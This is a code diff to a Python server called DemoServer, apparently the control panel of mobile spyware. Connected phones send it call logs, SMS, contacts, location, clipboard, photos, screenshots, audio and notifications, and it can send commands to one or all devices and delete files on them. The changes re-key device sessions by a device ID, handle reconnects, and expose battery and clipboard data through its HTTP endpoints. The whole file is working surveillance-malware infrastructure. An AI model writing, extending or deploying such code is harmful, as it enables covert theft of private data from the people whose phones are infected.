@@ -47,6 +47,7 @@ class DeviceSession:
         self.connected = True
         self.last_heartbeat = time.time()
         self.device_info = {}
+        self.device_id = None          # Will be set when we get device_info message
         self.pending_file = None  # For incoming file transfers
         self.total_images_received = 0
         self.total_screenshots_received = 0
@@ -77,8 +78,8 @@ class DemoServer:
         self.port = port
         self.server_socket = None
         self.running = False
-        self.sessions = {}
-        self.session_counter = 0
+        self.sessions = {}  # device_id (string) -> DeviceSession
+        self._conn_counter = 0  # internal counter for temp session_ids only
         self.lock = threading.Lock()
         self.start_time = time.time()
         self.log_queue = log_queue  # Queue for sending log messages to GUI (if any)
@@ -143,7 +144,6 @@ class DemoServer:
     def update_stats(self):
         with self.lock:
             self.stats['active_connections'] = len([s for s in self.sessions.values() if s.connected])
-            self.stats['total_connections'] = self.session_counter
             self.stats['total_images'] = sum(s.total_images_received for s in self.sessions.values())
             self.stats['total_screenshots'] = sum(s.total_screenshots_received for s in self.sessions.values())
             self.stats['total_audio'] = sum(s.total_audio_received for s in self.sessions.values())
@@ -220,12 +220,11 @@ class DemoServer:
                 try:
                     client_socket, address = self.server_socket.accept()
                     with self.lock:
-                        self.session_counter += 1
-                        session_id = self.session_counter
+                        self._conn_counter += 1
+                        session_id = self._conn_counter
                     session = DeviceSession(session_id, address, client_socket)
-                    with self.lock:
-                        self.sessions[session_id] = session
-                    self.stats['total_connections'] = self.session_counter
+                    self.stats['total_connections'] = self._conn_counter
+                    # Do NOT add to self.sessions yet — device_id unknown until device_info arrives
 
                     self.log(f"[+] New connection #{session_id} from {address[0]}:{address[1]}")
                     client_thread = threading.Thread(
@@ -462,29 +461,23 @@ class DemoServer:
             print("  " + "-" * 90)
             print(f"  {'ID':<4} | {'IP':<15} | {'Model':<20} | {'Status':<8} | {'Img':<4} | {'Vid':<4} | {'Notif':<6}")
             print("  " + "-" * 90)
-            for sid, session in self.sessions.items():
+            for device_id, session in self.sessions.items():
                 status = "ONLINE" if session.connected else "OFFLINE"
                 ip = session.address[0]
                 model = session.device_info.get('model', 'Unknown')[:20]
-                print(f"  {sid:<4} | {ip:<15} | {model:<20} | {status:<8} | "
+                print(f"  {device_id[:16]:<16} | {ip:<15} | {model:<20} | {status:<8} | "
                       f"{session.total_images_received:<4} | {session.total_videos_received:<4} | {session.total_notifications_received:<6}")
             print("  " + "-" * 90)
 
     def send_command_to_all(self, command, args_json=""):
-        """Send command to all connected devices (clean up dead sessions first)"""
-        with self.lock:
-            # Clean up dead sessions
-            dead = [sid for sid, s in self.sessions.items() if not s.connected]
-            for sid in dead:
-                del self.sessions[sid]
-            if not self.sessions:
-                print("  No devices connected.")
-                return
+        """Send command to all connected devices"""
         sent = 0
-        for sid, session in list(self.sessions.items()):
+        with self.lock:
+            sessions = list(self.sessions.values())
+        for session in sessions:
             if session.connected:
                 self.send_command(session, command, args_json)
-                self.log_command(command, sid)
+                self.log_command(command, session.session_id)
                 sent += 1
         self.log(f"[+] Command '{command}' sent to {sent} device(s)")
 
@@ -627,9 +620,41 @@ class DemoServer:
             self.log(f"[♥] Heartbeat from session {session.session_id} ({session.address[0]})")
 
         elif msg_type == "device_info":
-            session.device_info = message.get("device_info", {})
+            device_info = message.get("device_info", {})
+            session.device_info = device_info
             session.last_device_info = message
+            session.device_id = device_info.get("device_id")
             session.last_heartbeat = time.time()
+
+            # Register session by device_id — replace old session if same device reconnects
+            with self.lock:
+                if session.device_id and session.device_id in self.sessions:
+                    old = self.sessions[session.device_id]
+                    if old.connected:
+                        try:
+                            old.client_socket.shutdown(socket.SHUT_RDWR)
+                        except:
+                            pass
+                        try:
+                            old.client_socket.close()
+                        except:
+                            pass
+                    old.connected = False
+                    # Copy counters from old session to new session (preserve cumulative stats)
+                    session.total_images_received += old.total_images_received
+                    session.total_screenshots_received += old.total_screenshots_received
+                    session.total_audio_received += old.total_audio_received
+                    session.total_videos_received += old.total_videos_received
+                    session.total_files_received += old.total_files_received
+                    session.total_notifications_received += old.total_notifications_received
+                    session.total_commands_processed += old.total_commands_processed
+                    # Replace old session with new one
+                    self.sessions[session.device_id] = session
+                    self.log(f"[+] Device {session.device_id} reconnected — replaced old session #{old.session_id} with #{session.session_id}")
+                elif session.device_id:
+                    # New device
+                    self.sessions[session.device_id] = session
+
             info = session.device_info
             self.log(f"[i] Device info from session {session.session_id}:")
             self.log(f"    Model: {info.get('model', 'Unknown')}")
@@ -1027,9 +1052,10 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
             return
         with self.server_instance.lock:
             devices = []
-            for sid, session in self.server_instance.sessions.items():
+            for device_id, session in self.server_instance.sessions.items():
                 devices.append({
-                    'id': sid,
+                    'id': device_id,
+                    'session_id': session.session_id,
                     'ip': session.address[0],
                     'model': session.device_info.get('model', 'Unknown'),
                     'status': 'ONLINE' if session.connected else 'OFFLINE',
@@ -1071,13 +1097,13 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
         session_id = data.get('session_id', None)
         if isinstance(args, dict):
             args = json.dumps(args)
-        if session_id is not None:
-            # Send to specific session
+        if session_id is not None and session_id != '' and session_id != 'null':
+            # Send to specific device (session_id is now a device_id string)
             with self.server_instance.lock:
-                session = self.server_instance.sessions.get(int(session_id))
+                session = self.server_instance.sessions.get(session_id)
             if session and session.connected:
                 self.server_instance.send_command(session, command, args)
-                self.server_instance.log_command(command, int(session_id))
+                self.server_instance.log_command(command, session.session_id)
                 self.send_json_response({'status': 'sent', 'command': command, 'session': session_id})
             else:
                 self.send_json_response({'status': 'error', 'message': 'Session not found or offline'})
@@ -1090,9 +1116,9 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
         if not self.server_instance:
             self.send_error(500, "Server not available")
             return
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             if session and session.last_gallery_list is not None:
                 self.send_json_response({'gallery': session.last_gallery_list, 'session': sid})
             else:
@@ -1103,9 +1129,9 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
         if not self.server_instance:
             self.send_error(500, "Server not available")
             return
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             if session and session.last_file_list is not None:
                 self.send_json_response({'files': session.last_file_list, 'session': sid})
             else:
@@ -1116,10 +1142,10 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
         if not self.server_instance:
             self.send_error(500, "Server not available")
             return
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         dtype = query.get('type', ['all'])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             if not session:
                 self.send_json_response({'error': 'Session not found'})
                 return
@@ -1138,6 +1164,10 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
                 result['storage'] = session.last_storage_info or {}
             if dtype in ['all', 'device_info']:
                 result['device_info'] = session.last_device_info or {}
+            if dtype in ['all', 'battery_info']:
+                result['battery_info'] = session.last_battery_info or {}
+            if dtype in ['all', 'clipboard']:
+                result['clipboard'] = session.last_clipboard or {}
             result['session'] = sid
             self.send_json_response(result)
 
@@ -1240,57 +1270,57 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
         self.send_json_response({'screenshots': files_list})
 
     def handle_get_call_logs(self, query):
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             self.send_json_response({'call_logs': session.last_call_logs} if session else {'call_logs': []})
 
     def handle_get_contacts(self, query):
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             self.send_json_response({'contacts': session.last_contacts} if session else {'contacts': []})
 
     def handle_get_sms_logs(self, query):
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             self.send_json_response({'sms_logs': session.last_sms_logs} if session else {'sms_logs': []})
 
     def handle_get_app_list(self, query):
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             self.send_json_response({'apps': session.last_app_list} if session else {'apps': []})
 
     def handle_get_location(self, query):
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             self.send_json_response({'location': session.last_location} if session else {'location': {}})
 
     def handle_get_storage(self, query):
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             self.send_json_response({'storage': session.last_storage_info} if session else {'storage': {}})
 
     def handle_get_device_info_data(self, query):
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             self.send_json_response({'device_info': session.last_device_info} if session else {'device_info': {}})
 
     def handle_get_battery(self, query):
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             self.send_json_response({'battery': session.last_battery_info} if session else {'battery': {}})
 
     def handle_get_clipboard(self, query):
-        sid = query.get('session', ['1'])[0]
+        sid = query.get('session', [''])[0]
         with self.server_instance.lock:
-            session = self.server_instance.sessions.get(int(sid))
+            session = self.server_instance.sessions.get(sid)
             self.send_json_response({'clipboard': session.last_clipboard} if session else {'clipboard': {}})
 
     def handle_delete_file(self, query):
